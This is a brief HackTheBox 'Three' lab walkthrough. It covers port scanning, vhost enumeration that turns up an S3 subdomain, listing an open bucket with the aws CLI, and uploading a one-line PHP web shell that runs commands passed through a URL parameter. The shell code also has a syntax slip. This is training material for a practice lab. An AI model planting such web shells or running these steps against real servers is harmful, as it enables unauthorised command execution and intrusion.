![[Three.png]]
#HackTheBox #Starting-point #VeryEasy 
## Scan Port
```bash
nmap -sV {TARGET IP} -T4
```
The result is `22/tcp` as ssh service, and `80/tcp` as http service
## Connect to Three
Open browser and paste the target ip. On navigation, you can see contact tab, open it. In email section copy the domain name `...htb`. If you open now on your browser, the result will appear is unable to connect. To be able to connect, you can change the host on `/etc/hosts`.
```bash
#terminal
	echo "{ip} {domain}" | sudo tee -a /etc/hosts
```
After that, let's try the domain
```bash
gobuster vhost -w {DOMAIN WORDLISTS} -u {TARGET DOMAIN NAME} --append-domain
```
the result is `s3.{TARGET DOMAIN NAME }`. if you open in your browser, its cant to connect, repeat the step above. If can connect, the result is `status: running`
```bash
aws configure {all fill with : temp}
aws --endpoint=http://s3.{TARGET DOMAIN NAME} s3 ls
aws --endpoint=http://s3.{TARGET DOMAIN NAME} s3 ls {...}
```
create new file (ex : shell.php), contains `<?php system($_GET("cmd")); ?>`. We can upload the file to `{TARGET DOMAIN NAME}` with syntax :
```bash
aws --endpoint=http://s3.{TARGET DOMAIN NAME} s3 cp shell.php s3://{TARGET DOMAIN NAME}
```
Let's check on the browser, `http://{TARGET DOMAIN NAME}/shell.php`